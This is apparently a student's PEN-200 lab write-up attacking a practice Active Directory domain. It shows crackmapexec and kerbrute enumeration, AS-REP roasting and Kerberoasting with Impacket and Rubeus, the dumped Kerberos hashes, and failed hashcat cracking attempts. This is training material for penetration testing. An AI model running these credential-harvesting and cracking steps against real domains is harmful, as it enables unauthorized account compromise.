# PEN-200: Attacking Active Directory Authentication : Capstone VM Group 2

## Capstone VM Group 2

### Validate Pete Credentials

```
crackmapexec smb 192.168.182.70 -u pete -p Nexus123!

SMB         192.168.182.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.182.70  445    DC1              [+] corp.com\pete:Nexus123! 
```

### Enumerate Users

```
crackmapexec smb 192.168.182.70 -u pete -p Nexus123! --users

SMB         192.168.182.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.182.70  445    DC1              [+] corp.com\pete:Nexus123! 
SMB         192.168.182.70  445    DC1              [*] Trying to dump local users with SAMRPC protocol
SMB         192.168.182.70  445    DC1              [+] Enumerated domain user(s)
SMB         192.168.182.70  445    DC1              corp.com\Administrator                  Built-in account for administering the computer/domain
SMB         192.168.182.70  445    DC1              corp.com\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.182.70  445    DC1              corp.com\krbtgt                         Key Distribution Center Service Account
SMB         192.168.182.70  445    DC1              corp.com\dave                           
SMB         192.168.182.70  445    DC1              corp.com\stephanie                      
SMB         192.168.182.70  445    DC1              corp.com\jeff                           
SMB         192.168.182.70  445    DC1              corp.com\jeffadmin                      
SMB         192.168.182.70  445    DC1              corp.com\iis_service                    
SMB         192.168.182.70  445    DC1              corp.com\pete                           
SMB         192.168.182.70  445    DC1              corp.com\jen                            
SMB         192.168.182.70  445    DC1              corp.com\mike                           
SMB         192.168.182.70  445    DC1              corp.com\maria 
```

### Enumerate groups

```
crackmapexec smb 192.168.182.70 -u pete -p Nexus123! --groups

SMB         192.168.182.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.182.70  445    DC1              [+] corp.com\pete:Nexus123! 
SMB         192.168.182.70  445    DC1              [+] Enumerated domain group(s)
SMB         192.168.182.70  445    DC1              Debug                                    membercount: 0
SMB         192.168.182.70  445    DC1              Development Department                   membercount: 3
SMB         192.168.182.70  445    DC1              Management Department                    membercount: 1
SMB         192.168.182.70  445    DC1              Sales Department                         membercount: 3
SMB         192.168.182.70  445    DC1              DnsUpdateProxy                           membercount: 0
SMB         192.168.182.70  445    DC1              DnsAdmins                                membercount: 0
SMB         192.168.182.70  445    DC1              Enterprise Key Admins                    membercount: 0
SMB         192.168.182.70  445    DC1              Key Admins                               membercount: 0
SMB         192.168.182.70  445    DC1              Protected Users                          membercount: 0
SMB         192.168.182.70  445    DC1              Cloneable Domain Controllers             membercount: 0
SMB         192.168.182.70  445    DC1              Enterprise Read-only Domain Controllers  membercount: 0
SMB         192.168.182.70  445    DC1              Read-only Domain Controllers             membercount: 0
SMB         192.168.182.70  445    DC1              Denied RODC Password Replication Group   membercount: 8
SMB         192.168.182.70  445    DC1              Allowed RODC Password Replication Group  membercount: 0
SMB         192.168.182.70  445    DC1              Terminal Server License Servers          membercount: 0
SMB         192.168.182.70  445    DC1              Windows Authorization Access Group       membercount: 1
SMB         192.168.182.70  445    DC1              Incoming Forest Trust Builders           membercount: 0
SMB         192.168.182.70  445    DC1              Pre-Windows 2000 Compatible Access       membercount: 1
SMB         192.168.182.70  445    DC1              Account Operators                        membercount: 0
SMB         192.168.182.70  445    DC1              Server Operators                         membercount: 0
SMB         192.168.182.70  445    DC1              RAS and IAS Servers                      membercount: 0
SMB         192.168.182.70  445    DC1              Group Policy Creator Owners              membercount: 1
SMB         192.168.182.70  445    DC1              Domain Guests                            membercount: 0
SMB         192.168.182.70  445    DC1              Domain Users                             membercount: 0
SMB         192.168.182.70  445    DC1              Domain Admins                            membercount: 3
SMB         192.168.182.70  445    DC1              Cert Publishers                          membercount: 0
SMB         192.168.182.70  445    DC1              Enterprise Admins                        membercount: 1
SMB         192.168.182.70  445    DC1              Schema Admins                            membercount: 1
SMB         192.168.182.70  445    DC1              Domain Controllers                       membercount: 0
SMB         192.168.182.70  445    DC1              Domain Computers                         membercount: 0
SMB         192.168.182.70  445    DC1              Storage Replica Administrators           membercount: 0
SMB         192.168.182.70  445    DC1              Remote Management Users                  membercount: 0
SMB         192.168.182.70  445    DC1              Access Control Assistance Operators      membercount: 0
SMB         192.168.182.70  445    DC1              Hyper-V Administrators                   membercount: 0
SMB         192.168.182.70  445    DC1              RDS Management Servers                   membercount: 0
SMB         192.168.182.70  445    DC1              RDS Endpoint Servers                     membercount: 0
SMB         192.168.182.70  445    DC1              RDS Remote Access Servers                membercount: 0
SMB         192.168.182.70  445    DC1              Certificate Service DCOM Access          membercount: 0
SMB         192.168.182.70  445    DC1              Event Log Readers                        membercount: 0
SMB         192.168.182.70  445    DC1              Cryptographic Operators                  membercount: 0
SMB         192.168.182.70  445    DC1              IIS_IUSRS                                membercount: 1
SMB         192.168.182.70  445    DC1              Distributed COM Users                    membercount: 0
SMB         192.168.182.70  445    DC1              Performance Log Users                    membercount: 0
SMB         192.168.182.70  445    DC1              Performance Monitor Users                membercount: 0
SMB         192.168.182.70  445    DC1              Network Configuration Operators          membercount: 0
SMB         192.168.182.70  445    DC1              Remote Desktop Users                     membercount: 0
SMB         192.168.182.70  445    DC1              Replicator                               membercount: 0
SMB         192.168.182.70  445    DC1              Backup Operators                         membercount: 0
SMB         192.168.182.70  445    DC1              Print Operators                          membercount: 0
SMB         192.168.182.70  445    DC1              Guests                                   membercount: 2
SMB         192.168.182.70  445    DC1              Users                                    membercount: 3
SMB         192.168.182.70  445    DC1              Administrators                           membercount: 4
```

### Enumerate users using kerbrute

```
kerbrute userenum -d corp.com --dc 192.168.182.70 /opt/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_ad_users 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/11/24 - Ronnie Flathers @ropnop

2024/09/11 20:19:41 >  Using KDC(s):
2024/09/11 20:19:41 >  	192.168.182.70:88

2024/09/11 20:19:41 >  [+] VALID USERNAME:	 mike@corp.com
2024/09/11 20:19:41 >  [+] VALID USERNAME:	 dave@corp.com
2024/09/11 20:19:41 >  [+] VALID USERNAME:	 jeff@corp.com
2024/09/11 20:19:42 >  [+] VALID USERNAME:	 pete@corp.com
2024/09/11 20:19:42 >  [+] VALID USERNAME:	 maria@corp.com
2024/09/11 20:19:43 >  [+] VALID USERNAME:	 Mike@corp.com
2024/09/11 20:19:44 >  [+] VALID USERNAME:	 Dave@corp.com
2024/09/11 20:19:44 >  [+] VALID USERNAME:	 administrator@corp.com
2024/09/11 20:19:45 >  [+] VALID USERNAME:	 stephanie@corp.com
2024/09/11 20:19:46 >  [+] VALID USERNAME:	 MIKE@corp.com
2024/09/11 20:19:47 >  [+] VALID USERNAME:	 Jeff@corp.com
2024/09/11 20:19:50 >  [+] VALID USERNAME:	 DAVE@corp.com
2024/09/11 20:19:54 >  [+] VALID USERNAME:	 Pete@corp.com
2024/09/11 20:19:57 >  [+] VALID USERNAME:	 JEFF@corp.com
2024/09/11 20:20:00 >  [+] VALID USERNAME:	 jen@corp.com
2024/09/11 20:20:00 >  [+] VALID USERNAME:	 Stephanie@corp.com
2024/09/11 20:20:09 >  [+] VALID USERNAME:	 Administrator@corp.com
2024/09/11 20:20:14 >  [+] VALID USERNAME:	 Maria@corp.com
2024/09/11 20:20:37 >  [+] VALID USERNAME:	 PETE@corp.com

```

### ASREPRoasting (Get TGT on accounts where preauth is disabled)

```
GetNPUsers.py -dc-ip 192.168.182.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
mike                                            2024-09-11 20:11:59.764401  2024-09-11 20:19:46.717522  0x400200 
dave  CN=Development Department,DC=corp,DC=com  2024-09-11 20:11:58.842521  2024-09-11 20:25:28.045651  0x410200 



$krb5asrep$23$mike@CORP.COM:56964a6771b528c62799a9989c432a52$2d213372743f50afa0d5a42f519334b7e8e8b69f29260a9b7afbd8044c37a9ed2d55f3f2742b40bffe18493bb440df7e7b224e97d567e4aaf84fca9b4058897e7c463f3d59b42109d33860fc60ebf495bf3a45eb9be00624c7aa3fb6a85c1e6919284fb5a3df9603a25dfef746cce4fbcf7f191c85e1dd2a457831f684df1ab5c89af111084594cdb5673d948aef2db0f61beb1a86016b8e563616e1692828942288612facb45848b30cccaddb294d88fac826968ef2587a3dfe3d7a4fd3b490335094968b98817d5ba1e971716cf9318e1154e720ff77b3c32d2928a73ce39b9608a8b1
$krb5asrep$23$dave@CORP.COM:922bef006629efb5162d36e4127a8449$69aeb1e76d728179f0853ff860fa4e0c27db7cb361a42f66010c33031e5f6a81644a1e31dc44f5362bf354509f416dc49dd9938c35b3a0b91247478453e9aa33d88c7089160932bd4067d4c412a0b31c976558a1aee0b933f8fbedcc332ccf6ce70e31f86b1024bff4a734cd50ee2761089f43eeac68b2bda78410f9c597455557963571fa7684038a8d2b52fb1e39b41a686f6150113980593b2bd558eb9a6ac8b979b1709ec6e89466558704f75d802b00371ce684f59f9e48037813c11d0820698c4a1242f28c361770411f93920f4fcc2c3abdff65a29538fe22ebb1278f4a6ff81e
```

### Try to crack TGT offline (FAILED)

<pre><code>sudo hashcat -m 18200 hashes.asreproast rockyou1 -r /usr/share/hashcat/rules/best64.rule --force
<strong>sudo hashcat -m 18200 hashes.asreproast rockyou1.txt --force   
</strong>sudo hashcat -m 18200 hashes.asreproast rockyou_exclam.txt --force 

Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 2744320/28688768 (9.57%)
</code></pre>

### Kerbeorasting from .72 (web04)

```
.\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.182.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:4984DF3421928F4D159246F5912325CF$0C68BA5D6BFEEB3F8C92FEE152FAA9E59165023000C0456A96BDEA4371CE67F5273FD23FD551C3F89509A9068F0440E68F50F8A63D1E971120974316373E76F99DB61651BBA6E03BADE97D441F166727E9A60301AFD7BE2ACC55D5C1CCAB8CBE269E45715C8FC7004D2E87FEE9B9D3B89601A620192EB00B609DA2EAAB884FD7D3216D13EE60F1372A597EB57C78C5172A3EFC57E64CFBB32D97F68AEFE7128A628C8FB169D157C31DBE5E7DD48D7A9189FEE09F1E6DA5AED683976A7615668E66D42B9CB383DE75AC1DD23D78BED323ADD4C19D7142C5EC9F9CDCB266483D7CF15C95EE

[*] SamAccountName         : mike
[*] DistinguishedName      : CN=mike,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.182.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\mike'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$mike@corp.com:E0FA216973D5FCBBBD17EB622AA3182E$EC16D318A9D39AAB3125F2994206F5657F2265E5FBF26B9F29B6135C2181B8B8B9F4ACA5F2DAF98480EB1BE46A0C83DB5F41030FD480F480B4F6A4DACEDAC79B33E76D8044797A82846D17EA0C062D21739B8988F84C56AF63DBAA5CA0D3AF0A16F7335E891AD18B0DD4C2BD4B93E9EB780BD7CE1642B73F111AAE84FC85B03578D3F60FEBE339D13FD465E1B631C57828AD3565521D1FFCD21407DC6AF4EE13986E429AED04902A9DA21AEAC7F1D2792CA7A6499FA8420F512501307651DDA81583C3F3A3E380A4305A6B633337AE78DBB6C8BAB4865FE6353BC7ECFE3B33D68F72F5F6
```

### Try to crack TGT offline (FAILED)

<pre><code>sudo hashcat -m 18200 hashes.asreproast rockyou1 -r /usr/share/hashcat/rules/best64.rule --force
<strong>sudo hashcat -m 18200 hashes.asreproast rockyou1.txt --force   
</strong>sudo hashcat -m 18200 hashes.asreproast rockyou_exclam.txt --force 

Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 2744320/28688768 (9.57%)
</code></pre>

### Get all accounts with SPN

```
GetUserSPNs.py -dc-ip 192.168.182.70 corp.com/pete             
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04              iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained 


```

### Get all TGS of SPN accounts

```
GetUserSPNs.py -dc-ip 192.168.182.70 corp.com/pete -request -outputfile corp_tgs
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com     iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04              iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service            2024-09-11 20:11:58.936269  2023-03-01 11:40:02.088156  unconstrained

  cat corp_tgs                                        
  $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$8997e4b0bc7ffe4b708954c59678adbf$563829043282c776a760459241efe8cc19d2bda27be2faca753623413cee9068a997e1e1559e6c2f920c3c0e1741e313c62d854c6f3dc090f18af35a76a81aece01acf5784dab8362799ee9b7056c1797073164fbcda47730af797cb0db2eadf1d81d3e4d3d57b98deb78439e9f79fdb257dd139b91f3dcaf958d5731ed99a4557df4774305783281615379aa7aa25f10dfd083e54349f78024e3f9ad6baceca04aaff7c719cb308f7ee703d204c36c8609916c56a1a749a22d64e6c5de1c29044c91c102eb65204c52dae8da0cee5c3ef00db4b5461fe46cf87eb95f76934ee4e11c28dacf83221c3215a09f87610a755e40c685ad4cc6049c4883f0f389a856c04127d30323f584951f6b65643d650f8c5623c12c39e6390dcaa804e7d61bb3499467bb8f22e37920748f1eb9f987b3dd29fab2e42b7dec1c3fba8bbfeefcd21bf00b04030f7b3022a15d37b387426c844a80ceb1fbfe1584e8c20df1a18a63d6f4c361ababa26057e0a6756b8d100a8f586a1aa95ca74f52c745344d684e47e942ec4b39b92b1593d40e8a8c0360c6cdca47751e93c808f92543324e97b9f254deee1883b60560d920059424c83edc01974c20b1aa49aa70668b8be16f71e65931a11bb9ece0427484ebf559b75231900a062662ed5206a31484b5416890d43fe89cd2698c0c307f56d7b1cfd5b9a9cf6f21022a63183032160072a2b5ad103ccb090a0a5c743f955895aac7f857c65f073bd652c891ceadcccd9393c79b044084f4c2ae6573e194fc8ef8c117c0d615e0a6f21358557b1dc3a574ed9b4c5362275748748198ddbeb36d15398e695b4bdadb72e73d50e09aca4c7991bd9fee5f7659a45ec6a029ad7dce40c76908f426d1ab3d7105b704381145ad4bf7b8b6d935d43a32e3bb2df945ee156cdc4be48fd16a48d2d66088eaaffcce1986b1c3537fdd0a58beb6a7147363bd268720942d3c2ab4c7e28f68f29fd785c065fbb8a6bd6bfaff870e19da3e8f6ab39cb015c08a499c7408d83ce0ceaae28b28910d16f5016bcb5e993a7ac244267960110f68bbdf34cb3dd640da6562ba0868adc429c5dff4a12eb9e372982e46fbdfc04ff080569f6b4f8aa24d4e283649d2f6189750aa362acf9f837a2eacec235e6a6762db321af3be8cf76fe4b2cd1578398d6e7b2cfd035807e47235577813e1b0138c67badecdbe451ca291df9be809c359a76d6e593d96ea38306c8218701babf836fce47bec2135c8f3869f05ac98db3658e9fa23985761b3cbab1ecb9ce17f7ce2dbcad5f840e5b0061e78d789309a955ef7310e8c9b55d371c93ed8ecefa4c9a6ee02080071df0135d82ac8e
```

### Try to crack TGS offline (FAILED)

```
sudo hashcat -m 13100 corp_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
sudo hashcat -m 13100 corp_tgs rockyou1.txt --force 
sudo hashcat -m 13100 corp_tgs rockyou_exclam.txt --force
```

### New wordlists

```
cat 1.rule
$1
cat exclam.rule
$!
hashcat --stdout -r 1.rule /opt/rockyou.txt
hashcat --stdout -r exclam.rule /opt/rockyou.txt

sudo hashcat -m 18200 hashes.asreproast rockyou1 -r 1.rule --force
```

